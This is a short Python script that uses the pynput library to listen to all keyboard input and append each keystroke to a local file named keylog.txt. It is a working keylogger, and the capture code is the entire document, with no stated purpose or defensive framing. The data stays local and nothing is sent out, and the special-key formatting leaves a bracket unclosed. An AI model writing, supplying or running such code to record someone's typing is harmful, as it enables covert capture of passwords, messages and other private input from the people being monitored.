from pynput import keyboard


def on_press(key):
    with open("keylog.txt","a") as f:
        try:
            f.write(key.char)
        except:
            f.write(f" [{key} ")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

